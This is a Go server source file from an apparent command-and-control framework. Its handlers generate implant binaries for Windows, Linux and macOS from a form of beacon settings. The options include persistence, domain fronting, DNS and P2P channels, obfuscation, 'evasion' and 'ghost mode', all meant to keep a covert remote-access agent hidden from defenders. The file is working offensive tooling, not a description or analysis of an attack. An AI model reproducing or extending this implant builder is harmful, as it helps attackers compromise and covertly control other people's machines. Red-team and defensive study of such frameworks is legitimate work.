package server

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/payload"
	"github.com/gin-gonic/gin"
	"github.com/forgec2/forgec2/internal/util"
	"golang.org/x/crypto/ssh"
)

type binaryGenForm struct {
	C2URL           string `form:"c2_url"`
	Protocol        string `form:"protocol"`
	BeaconTransport string `form:"beacon_transport"`
	Interval        int    `form:"interval"`
	Jitter          int    `form:"jitter"`
	BeaconTime      int    `form:"beacon_time"`
	UserAgent       string `form:"user_agent"`
	Persist         bool   `form:"persist"`
	SkipTLSVerify   bool   `form:"skip_tls_verify"`
	Filename        string `form:"filename"`
	Profile         string `form:"profile"`
	ListenerID      uint   `form:"listener_id"`
	P2PMode         string `form:"p2p_mode"`
	P2PParent       string `form:"p2p_parent"`
	P2PListenAddr   string `form:"p2p_listen_addr"`
	DNSDomain       string `form:"dns_domain"`
	DNSServer       string `form:"dns_server"`
	DNSDoHURL       string `form:"dns_doh_url"`
	DNSDoTAddr      string `form:"dns_dot_addr"`
	Proxy           string `form:"proxy"`
	CryptoKey       string `form:"crypto_key"`
	BeaconKey       string `form:"beacon_key"` // pre-shared key; empty = server's configured beacon_key
	Architecture    string `form:"architecture"`
	DomainFront     string `form:"domain_front"`
	Obfuscate       string `form:"obfuscate"`
	Evasion         string `form:"evasion"`
	GhostMode       string `form:"ghost_mode"`
	WorkingStart    string `form:"working_start"`
	WorkingEnd      string `form:"working_end"`
	WorkingTZ       string `form:"working_tz"`
	SSHUser         string `form:"ssh_user"`
	SSHPassword     string `form:"ssh_password"`
	SSHKey          string `form:"ssh_key"`
	SSHHostKey      string `form:"ssh_host_key"` // base64 server host public key pin
	PinnedCertSHA256 string `form:"pinned_cert_sha256"`
	ExpiryDate      string `form:"expiry_date"`   // "YYYY-MM-DD"; implant auto-exits after this date
	SelfCheck       bool   `form:"self_check"`    // embed + verify a SHA-256 self-integrity hash
	NetCfgOverWire  bool   `form:"network_config_over_wire"` // bootstrap-only compile; server delivers full config at registration
	// Max random bytes appended to the HTTP/WS beacon body (0=disabled).
	ContentLengthJitter int `form:"content_length_jitter"`
}

// parseBinaryForm validates a binary generation request and returns the resolved form.
// Returns (form, error) — on error the response has already been written.
func (s *Server) parseBinaryForm(c *gin.Context) (*binaryGenForm, bool) {
	var form binaryGenForm
	if err := c.ShouldBind(&form); err != nil {
		respondError(c, http.StatusBadRequest, "Invalid request parameters")
		return nil, false
	}

	isP2P := form.P2PMode == "parent" || form.P2PMode == "child"
	isDNS := form.DNSDomain != "" || form.DNSServer != ""

	if !isP2P && !isDNS && form.ListenerID == 0 {
		respondError(c, http.StatusBadRequest, "listener or DNS domain is required")
		return nil, false
	}

	if !isP2P && !isDNS {
		resolved, err := s.resolveListener(form.ListenerID)
		if err != nil {
			respondError(c, http.StatusBadRequest, "Invalid listener configuration")
			return nil, false
		}
		form.C2URL = resolved.C2URL
		form.Protocol = resolved.Protocol
		if form.BeaconTransport == "" {
			form.BeaconTransport = resolved.BeaconTransport
		}
		if resolved.DNSDomain != "" {
			form.DNSDomain = resolved.DNSDomain
			if form.DNSServer == "" {
				form.DNSServer = resolved.DNSServer
			}
		}
	} else if isDNS && form.Protocol == "" {
		form.Protocol = "dns"
		if form.BeaconTransport == "" {
			form.BeaconTransport = "dns"
		}
	}
	if form.BeaconTransport == "" {
		form.BeaconTransport = form.Protocol
	}
	if form.BeaconTransport == "" {
		form.BeaconTransport = "http"
	}

	if form.ExpiryDate != "" {
		if _, err := time.Parse("2006-01-02", form.ExpiryDate); err != nil {
			respondError(c, http.StatusBadRequest, "expiry_date must be in YYYY-MM-DD format")
			return nil, false
		}
	}

	// Prefix filename with short UUID to prevent concurrent build collisions.
	// Sanitize first to block path traversal and header-injection characters.
	if form.Filename != "" {
		form.Filename = sanitizeFilename(form.Filename)
		shortID := strings.Replace(util.NewString()[:8], "-", "", -1)
		form.Filename = fmt.Sprintf("%s_%s", shortID, form.Filename)
	}

	return &form, true
}

// buildImplantConfig constructs an ImplantConfig from the parsed binary form.
// Returns an error if a required v3 registration secret cannot be created, so
// the caller can fail the build rather than emit an unregisterable implant.
func (s *Server) buildImplantConfig(form *binaryGenForm) (payload.ImplantConfig, error) {
	interval, jitter := clampIntervalJitter(form.Interval, form.Jitter, form.BeaconTime)
	arch := parseArchitecture(form.Architecture)

	p2pMode := ""
	p2pParent := ""
	p2pListenAddr := ""
	if form.P2PMode == "parent" {
		p2pMode = "tcp"
		if form.P2PListenAddr != "" {
			p2pListenAddr = form.P2PListenAddr
		}
	} else if form.P2PMode == "child" {
		p2pParent = form.P2PParent
		form.Protocol = "http"
	}

	hostKey := form.SSHHostKey
	if hostKey == "" && s != nil {
		hostKey = s.loadSSHHostPublicKeyB64()
	}

	beaconKey := form.BeaconKey
	if beaconKey == "" && s != nil {
		beaconKey = s.serverBeaconKey()
	}

	// Malleable response wrapping: pull the server-wide profile prepend/append
	// so generated agents embed the matching strip tokens. Explicit per-build
	// profile values (if the form ever exposes them) would win via
	// NormalizeImplantConfig.
	prepend, appendBytes := "", ""
	if s != nil {
		s.configMu.RLock()
		prepend = s.cfg.Malleable.Prepend
		appendBytes = s.cfg.Malleable.Append
		s.configMu.RUnlock()
	}

	// v3: per-implant registration secret. When no explicit per-build beacon
	// key was supplied, the build would otherwise embed the fleet master key —
	// instead generate a unique 32-byte registration secret, persist it sealed
	// server-side, and embed ONLY that secret (plus its public id) in the
	// binary. Extracting one payload then yields no other agent's keys.
	var err error
	var regSecretID, regSecretB64 string
	regSecretID, regSecretB64, beaconKey, err = s.ensureV3RegSecret(beaconKey)
	if err != nil {
		return payload.ImplantConfig{}, err
	}

	return payload.ImplantConfig{
		C2URL:           form.C2URL,
		Protocol:        form.Protocol,
		BeaconTransport: form.BeaconTransport,
		Interval:        interval,
		Jitter:          jitter,
		UserAgent:       form.UserAgent,
		Persist:         form.Persist,
		SkipTLSVerify:   form.SkipTLSVerify,
		Filename:        form.Filename,
		Debug:           false,
		MalleablePrepend: prepend,
		MalleableAppend:  appendBytes,
		Profile:         form.Profile,
		ListenerID:      form.ListenerID,
		P2PMode:         p2pMode,
		P2PParent:       p2pParent,
		P2PListenAddr:   p2pListenAddr,
		DNSDomain:       form.DNSDomain,
		DNSServer:       form.DNSServer,
		DNSDoHURL:       form.DNSDoHURL,
		DNSDoTAddr:      form.DNSDoTAddr,
		Proxy:           form.Proxy,
		CryptoKey:       form.CryptoKey,
		BeaconKey:       beaconKey,
		RegSecretID:     regSecretID,
		RegSecret:       regSecretB64,
		Architecture:    arch,
		DomainFront:     form.DomainFront,
		Obfuscate:       form.Obfuscate == "true" || form.Obfuscate == "1",
		Evasion:         form.Evasion == "true" || form.Evasion == "1",
		GhostMode:       form.GhostMode == "true" || form.GhostMode == "1",
		WorkingStart:    form.WorkingStart,
		WorkingEnd:      form.WorkingEnd,
		WorkingTZ:       form.WorkingTZ,
		NetworkConfigOverWire: form.NetCfgOverWire,
		SSHUser:         form.SSHUser,
		SSHPassword:     form.SSHPassword,
		SSHKey:          form.SSHKey,
		SSHHostKey:      hostKey,
		PinnedCertSHA256: form.PinnedCertSHA256,
		ExpiryDate:       form.ExpiryDate,
		SelfCheck:        form.SelfCheck,
		ContentLengthJitter: form.ContentLengthJitter,
	}, nil
}

// serverBeaconKey returns the configured server beacon_key (empty = PSK auth disabled).
func (s *Server) serverBeaconKey() string {
	if s == nil || s.cfg == nil {
		return ""
	}
	s.configMu.RLock()
	defer s.configMu.RUnlock()
	return s.cfg.Server.BeaconKey
}

// handleGetBeaconKey returns the server's configured beacon_key so the Generate
// page can pre-fill the PSK field (operator-only, session-authenticated).
func (s *Server) handleGetBeaconKey(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"beacon_key": s.serverBeaconKey()})
}

// loadSSHHostPublicKeyB64 returns base64 of the SSH transport host public key for implant pinning.
func (s *Server) loadSSHHostPublicKeyB64() string {
	if s == nil || s.cfg == nil {
		return ""
	}
	path := s.cfg.Server.SSHHostKey
	if path == "" {
		return ""
	}
	raw, err := os.ReadFile(path)
	if err != nil || len(raw) == 0 {
		return ""
	}
	signer, err := ssh.ParsePrivateKey(raw)
	if err != nil {
		return ""
	}
	pub := signer.PublicKey()
	return base64.StdEncoding.EncodeToString(ssh.MarshalAuthorizedKey(pub))
}

func (s *Server) handleGenerateEXE(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	form, ok := s.parseBinaryForm(c)
	if !ok {
		return
	}
	cfg, err := s.buildImplantConfig(form)
	if err != nil {
		respondError(c, http.StatusInternalServerError, err.Error())
		return
	}
	agentsDir := s.extractAgentsDir()
	job := s.startBuildJob("windows", "exe", form.C2URL, form.ListenerID, form.Filename)

	if !s.submitBuild(job, func() (string, error) {
		return payload.GenerateWindowsEXE(cfg, agentsDir)
	}, "windows", "exe", form.C2URL, form.ListenerID, form.Filename) {
		s.abandonBuildJob(job)
		c.JSON(http.StatusTooManyRequests, gin.H{"success": false, "error": "build queue is full, retry shortly"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"success": true, "build_id": job.ID, "status": "building"})
}

func (s *Server) handleGenerateDLL(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	form, ok := s.parseBinaryForm(c)
	if !ok {
		return
	}
	cfg, err := s.buildImplantConfig(form)
	if err != nil {
		respondError(c, http.StatusInternalServerError, err.Error())
		return
	}
	agentsDir := s.extractAgentsDir()
	job := s.startBuildJob("windows", "dll", form.C2URL, form.ListenerID, form.Filename)

	if !s.submitBuild(job, func() (string, error) {
		return payload.GenerateWindowsDLL(cfg, agentsDir)
	}, "windows", "dll", form.C2URL, form.ListenerID, form.Filename) {
		s.abandonBuildJob(job)
		c.JSON(http.StatusTooManyRequests, gin.H{"success": false, "error": "build queue is full, retry shortly"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"success": true, "build_id": job.ID, "status": "building"})
}

func (s *Server) handleGenerateLinux(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	form, ok := s.parseBinaryForm(c)
	if !ok {
		return
	}
	cfg, err := s.buildImplantConfig(form)
	if err != nil {
		respondError(c, http.StatusInternalServerError, err.Error())
		return
	}
	agentsDir := s.extractAgentsDir()
	job := s.startBuildJob("linux", "elf", form.C2URL, form.ListenerID, form.Filename)

	if !s.submitBuild(job, func() (string, error) {
		return payload.GenerateLinuxELF(cfg, agentsDir)
	}, "linux", "elf", form.C2URL, form.ListenerID, form.Filename) {
		s.abandonBuildJob(job)
		c.JSON(http.StatusTooManyRequests, gin.H{"success": false, "error": "build queue is full, retry shortly"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"success": true, "build_id": job.ID, "status": "building"})
}

func (s *Server) handleGenerateMacOS(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	form, ok := s.parseBinaryForm(c)
	if !ok {
		return
	}
	cfg, err := s.buildImplantConfig(form)
	if err != nil {
		respondError(c, http.StatusInternalServerError, err.Error())
		return
	}
	agentsDir := s.extractAgentsDir()
	job := s.startBuildJob("macos", "binary", form.C2URL, form.ListenerID, form.Filename)

	if !s.submitBuild(job, func() (string, error) {
		return payload.GenerateMacOS(cfg, agentsDir)
	}, "macos", "binary", form.C2URL, form.ListenerID, form.Filename) {
		s.abandonBuildJob(job)
		c.JSON(http.StatusTooManyRequests, gin.H{"success": false, "error": "build queue is full, retry shortly"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"success": true, "build_id": job.ID, "status": "building"})
}
